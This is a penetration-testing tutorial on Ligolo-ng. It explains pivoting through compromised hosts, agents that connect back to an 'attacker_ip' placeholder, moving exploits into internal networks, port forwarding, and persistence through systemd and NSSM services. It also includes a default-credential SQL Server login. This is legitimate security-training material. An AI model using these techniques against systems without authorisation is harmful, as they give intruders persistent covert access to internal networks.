# Comprehensive Guide to Ligolo-ng for Penetration Testers

## Introduction

Ligolo-ng is a powerful, lightweight and cross-platform tunneling tool designed for network pivoting during penetration tests and red team operations. Created as a successor to the original Ligolo, this Go-based tool provides a flexible way to establish reverse tunnels and enables access to previously unreachable network segments from compromised hosts.

This guide covers comprehensive techniques for using Ligolo-ng effectively during penetration testing engagements, including single and double pivoting, file transfers through tunnels, port forwarding techniques, and comparing its functionality with similar tools like Chisel.

## Setup and Installation

### Prerequisites

- Go 1.16+ (for building from source)
- Administrator/root privileges (for setting up the TUN/TAP interface)
- Basic understanding of network routing and tunneling concepts

### Installing Ligolo-ng

#### From Precompiled Binaries

```bash
# Download the latest release from GitHub
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_Linux_64bit.tar.gz

# Extract the files
tar -xzvf ligolo-ng_agent_0.4.4_Linux_64bit.tar.gz
tar -xzvf ligolo-ng_proxy_0.4.4_Linux_64bit.tar.gz
```

#### Building from Source

```bash
# Clone the repository
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng

# Build the proxy
go build -o proxy cmd/proxy/main.go

# Build the agent
go build -o agent cmd/agent/main.go
```

## Components Overview

Ligolo-ng consists of two main components:

1. **Proxy**: Runs on the attacker's machine and serves as the control server.
2. **Agent**: Deployed on the compromised machine and connects back to the proxy.

## Basic Setup

### Setting up the Proxy (Attacker's Machine)

```bash
# Create the TUN interface (Linux)
sudo ip tuntap add user $(whoami) mode tun ligolo

# Set the TUN interface up
sudo ip link set ligolo up

# Start the proxy
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

For Windows:
```powershell
# Install the TAP driver (npcap or OpenVPN TAP driver)
# Then run the proxy
.\proxy.exe -selfcert -laddr 0.0.0.0:11601 -i Ethernet
```

### Deploying the Agent (Compromised Host)

Transfer the agent to the compromised host using your preferred method (web server, SMB, base64 encoding, etc.).

```bash
# Run the agent to connect back to the proxy
./agent -connect attacker_ip:11601 -ignore-cert
```

## Single Pivoting

Single pivoting involves using a compromised host to gain access to another network segment that was previously unreachable.

### Step 1: Establish Connection

After starting the proxy on your attack machine and the agent on your compromised host, you should see a connection established in the proxy console:

```
INFO[0010] Agent joined: 192.168.1.5                    
```

### Step 2: Start Session

In the Ligolo-ng proxy interface:

```
# List available agents
ligolo-ng » session

# Start a session with the agent
ligolo-ng » session 0

# Get network information from the agent
ligolo-ng (192.168.1.5) » ifconfig
```

### Step 3: Set Up Tunneling to Target Network

Let's say the compromised host (192.168.1.5) has access to an internal network (10.10.10.0/24) that your attack machine cannot reach:

```
# Add a route to the internal network through the Ligolo tunnel
ligolo-ng (192.168.1.5) » info

# Start the listener on the agent
ligolo-ng (192.168.1.5) » start

# Add the route on the proxy side
sudo ip route add 10.10.10.0/24 dev ligolo
```

### Step 4: Test Connectivity

Now you can access the internal network directly from your attack machine:

```bash
# Ping a host in the internal network
ping 10.10.10.50

# Scan the internal network
nmap -sV -p 22,80,443,3389 10.10.10.0/24
```

### Example Scenario: Accessing an Internal Web Server

```bash
# Discover internal web server
nmap -p 80 10.10.10.0/24

# Access the web server directly from your browser
firefox http://10.10.10.50
```

## Double Pivoting

Double pivoting allows you to reach a third network segment by pivoting through two compromised hosts.

### Initial Setup

- Attack Machine (192.168.1.10)
- First Pivot (192.168.1.5) with access to Second Network (10.10.10.0/24)
- Second Pivot (10.10.10.20) with access to Target Network (172.16.5.0/24)

### Step 1: Set Up First Pivot

Follow the single pivoting steps to establish connection with the first compromised host and add routes to the second network:

```bash
# On attack machine
sudo ip route add 10.10.10.0/24 dev ligolo
```

### Step 2: Deploy Agent on Second Pivot

Transfer the agent to the second pivot host:

```bash
# Using the tunnel to transfer the agent
scp -o ProxyCommand="nc -X connect -x 127.0.0.1:1080 %h %p" agent user@10.10.10.20:/tmp/
```

### Step 3: Set Up Multi-Listener on Proxy

To allow the second agent to connect back:

```
ligolo-ng » listener_add --addr 0.0.0.0:11602 --name second_listener

[+] Listener 'second_listener' added.
```

### Step 4: Connect Second Agent

On the second pivot (10.10.10.20):

```bash
./agent -connect attack_machine_ip:11602 -ignore-cert
```

### Step 5: Configure Second Pivot

In the Ligolo-ng proxy interface:

```
# List sessions
ligolo-ng » session

# Connect to the second pivot
ligolo-ng » session 1

# Get network info
ligolo-ng (10.10.10.20) » ifconfig

# Start listener
ligolo-ng (10.10.10.20) » start
```

### Step 6: Add Route to Third Network

```
# On attack machine
sudo ip route add 172.16.5.0/24 dev ligolo
```

### Step 7: Test Connectivity to Final Network

```bash
# Verify connectivity
ping 172.16.5.50

# Scan the network
nmap -sV 172.16.5.50
```

### Example Scenario: Accessing Database Server

```bash
# Discover database server
nmap -p 1433,3306,5432 172.16.5.0/24

# Connect to SQL Server
sqlcmd -S 172.16.5.60 -U sa -P password
```

## File Transfers Through Ligolo-ng Tunnels

Ligolo-ng tunnels allow you to transfer files between networks that were previously segmented.

### Using Built-in Tools

#### Direct Transfer using SCP/SFTP

```bash
# Transfer file to host in internal network
scp /path/to/local/file user@10.10.10.50:/path/on/target/

# Transfer file from host in internal network
scp user@10.10.10.50:/path/on/target/file /local/path/
```

#### Using HTTP Server

```bash
# Start Python HTTP server on attack machine
python3 -m http.server 8000

# Download file on internal host via the tunnel
wget http://attack_machine_ip:8000/file.txt
```

### Setting Up a SOCKS Proxy with Ligolo-ng

For more complex transfers or tools that don't natively support tunneling:

```
ligolo-ng (192.168.1.5) » socks5 127.0.0.1:1080
```

Then configure tools to use the SOCKS proxy:

```bash
# Using curl with SOCKS proxy
curl --socks5 127.0.0.1:1080 http://10.10.10.50/

# Using Firefox with SOCKS proxy
# Configure network settings to use SOCKS proxy at 127.0.0.1:1080
```

### Example Scenario: Transferring Exploitation Tools

```bash
# Set up SOCKS proxy
ligolo-ng (192.168.1.5) » socks5 127.0.0.1:1080

# Use proxychains to transfer files
proxychains scp /path/to/exploit user@10.10.10.50:/tmp/
```

## Port Forwarding with Ligolo-ng

Ligolo-ng offers various port forwarding options to access services on remote networks.

### Local Port Forwarding

Forward a port from the compromised host to your attack machine:

```
ligolo-ng (192.168.1.5) » listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --name web_server
```

Now you can access the web server at http://localhost:8080 from your attack machine.

### Remote Port Forwarding

Forward a port from your attack machine to the compromised host:

```
ligolo-ng (192.168.1.5) » forward_add --addr 0.0.0.0:4455 --to 127.0.0.1:4455 --name agent_server
```

### Dynamic Port Forwarding (SOCKS)

As shown earlier, you can set up a SOCKS proxy:

```
ligolo-ng (192.168.1.5) » socks5 127.0.0.1:1080
```

### Port Forwarding to Nested Networks

When dealing with multiple pivots:

```
# On session with first pivot
ligolo-ng (192.168.1.5) » listener_add --addr 0.0.0.0:8443 --to 10.10.10.50:443 --name internal_https

# On session with second pivot
ligolo-ng (10.10.10.20) » listener_add --addr 0.0.0.0:1521 --to 172.16.5.60:1521 --name oracle_db
```

### Example Scenario: Accessing Internal RDP Server

```
# Set up port forwarding to RDP server
ligolo-ng (192.168.1.5) » listener_add --addr 0.0.0.0:13389 --to 10.10.10.100:3389 --name rdp_server

# Connect using RDP client
xfreerdp /v:localhost:13389 /u:administrator /p:password
```

## Comparison Between Ligolo-ng and Chisel

Chisel is another popular tunneling tool used for similar purposes. Here's how they compare:

### Similarities

- Both tools provide tunneling capabilities
- Both support SOCKS proxying
- Both work on various operating systems
- Both use encrypted communications

### Differences

| Feature | Ligolo-ng | Chisel |
|---------|-----------|--------|
| **Architecture** | TUN/TAP based layer 3 tunneling | TCP tunneling with port forwarding |
| **Network Access** | Direct access to the entire subnet | Access only to specifically forwarded ports |
| **Setup Complexity** | Requires TUN/TAP configuration | Simpler setup with fewer dependencies |
| **Authentication** | TLS certificate-based | Password-based |
| **Performance** | Generally better for accessing multiple services | Good for specific port forwarding needs |
| **NAT Handling** | Better NAT traversal with reverse connections | May require more port forwarding rules |
| **Protocol Support** | Any IP-based protocol | TCP-based protocols |

### Code Comparison: Port Forwarding

#### Ligolo-ng

```
# In Ligolo-ng proxy console
ligolo-ng (192.168.1.5) » listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --name web_server
```

#### Chisel

```bash
# On attacker machine
./chisel server -p 8080 --reverse

# On compromised host
./chisel client attacker_ip:8080 R:8080:10.10.10.50:80
```

### When to Use Ligolo-ng vs. Chisel

- **Use Ligolo-ng when**:
  - You need to access entire network segments
  - You need to run tools that require direct network access
  - You need to pivot through multiple networks
  - Performance is a priority
  - You need to support non-TCP protocols

- **Use Chisel when**:
  - You can't set up TUN/TAP interfaces
  - You only need specific port forwarding
  - Simple setup is a priority
  - Target environments have limited capabilities

## Advanced Techniques

### Using Ligolo-ng with Proxy Chains

```bash
# Configure /etc/proxychains.conf
# Add the following line:
socks5 127.0.0.1 1080

# Use proxychains with tools
proxychains nmap -sT -Pn 172.16.5.60
```

### Automating Ligolo-ng Setup

Create a setup script for your attack machine:

```bash
#!/bin/bash
# ligolo-setup.sh

# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy in background
sudo ./proxy -selfcert -laddr 0.0.0.0:11601 &

# Wait for interface to be ready
sleep 2

echo "Ligolo-ng proxy is running. Interface is set up."
echo "Ready to receive agent connections."
```

### Handling Multiple Agents

When managing multiple compromised hosts:

```
# List all sessions
ligolo-ng » session

# Jump between sessions
ligolo-ng » session 0
ligolo-ng » session 1

# Name sessions for easier management
ligolo-ng » rename DMZ
```

### Pivoting with Multiple Network Interfaces

When the compromised host has multiple network interfaces:

```
# List all interfaces on the agent
ligolo-ng (192.168.1.5) » ifconfig

# Add routes for each network
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 192.168.2.0/24 dev ligolo
```

## Persistence Techniques

### Running Agent as a Service

#### Linux Systemd Service

```bash
# Create service file
cat > /etc/systemd/system/ligolo-agent.service << EOF
[Unit]
Description=Ligolo Agent Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/agent -connect attacker_ip:11601 -ignore-cert
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl enable ligolo-agent.service
systemctl start ligolo-agent.service
```

#### Windows Service

```powershell
# Using NSSM (Non-Sucking Service Manager)
nssm install LigoloAgent C:\path\to\agent.exe -connect attacker_ip:11601 -ignore-cert
nssm start LigoloAgent
```

## Troubleshooting

### Common Issues and Solutions

#### Connection Issues

If the agent cannot connect to the proxy:

```bash
# Check if the proxy is listening on the correct interface
netstat -tulpn | grep 11601

# Verify firewall rules
sudo iptables -L | grep 11601
```

#### Routing Problems

If you can't reach the internal network:

```bash
# Check if routes are properly set
ip route | grep ligolo

# Verify TUN/TAP interface is up
ip link show ligolo

# Test basic connectivity to the agent
ligolo-ng (192.168.1.5) » ping 8.8.8.8
```